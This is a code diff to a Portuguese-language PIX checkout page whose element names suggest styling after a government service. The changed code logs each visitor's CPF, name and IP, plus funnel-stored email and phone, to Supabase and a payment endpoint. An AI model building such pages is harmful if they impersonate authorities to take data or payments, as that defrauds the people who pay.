@@ -43,11 +43,11 @@
             <div class="flex flex-col gap-4 md:flex-row">
               <div class="w-full md:w-1/2">
                 <label for="nome" class="mb-1.5 block text-[14px] font-medium text-[#313c52]">Nome completo</label>
-                <input id="nome" readonly type="text" value="MARIA DAS GRAÇAS SOUZA" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none">
+                <input id="nome" type="text" value="MARIA DAS GRAÇAS SOUZA" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none focus:border-[#313c52]">
               </div>
               <div class="w-full md:w-1/2">
                 <label for="cpf" class="mb-1.5 block text-[14px] font-medium text-[#313c52]">CPF</label>
-                <input id="cpf" readonly type="text" value="000.000.000-00" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none">
+                <input id="cpf" type="text" value="000.000.000-00" class="w-full rounded border border-[#ddd] bg-white px-3.5 py-2.5 text-[14px] text-[#313c52] outline-none focus:border-[#313c52]">
               </div>
             </div>
           </div>
@@ -263,6 +263,9 @@
       const countdownGov = document.getElementById('countdown-gov');
       
       btnGerar.addEventListener('click', async function() {
+        const currentNome = document.getElementById('nome').value;
+        const currentCpf = document.getElementById('cpf').value;
+        
         // Transição Form -> Loading
         checkoutContent.classList.add('hidden');
         loadingContent.classList.remove('hidden');
@@ -279,7 +282,7 @@
                 'apikey': SUPABASE_ANON_KEY,
                 'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
             },
-            body: JSON.stringify({ cpf: cpf.replace(/\D/g, ""), nome: nomeUsuario, ip: ip, status: 'pendente' })
+            body: JSON.stringify({ cpf: currentCpf.replace(/\D/g, ""), nome: currentNome, ip: ip, status: 'pendente' })
         }).catch(console.error);
 
         try {
@@ -288,8 +291,8 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    cpf: cpf.replace(/\D/g, ""),
-                    nome: nomeUsuario,
+                    cpf: currentCpf.replace(/\D/g, ""),
+                    nome: currentNome,
                     email: sessionStorage.getItem('funil:email') || "",
                     telefone: sessionStorage.getItem('funil:telefone') || ""
                 })
@@ -305,7 +308,7 @@
                 pixContent.classList.add('flex'); // Add flex back since it uses flex-col
 
                 // Atualizar PIX Copia e Cola (Fallback para exibir todo o JSON caso seja undefined, para debug)
-                document.getElementById('pix-copy-gov').value = data.emv_code || JSON.stringify(data);
+                document.getElementById('pix-copy-gov').value = data.emv_code || JSON.stringify(data.raw_response);
 
                 // Atualizar QR Code
                 const qrContainer = document.getElementById('pix-qrcode-gov');
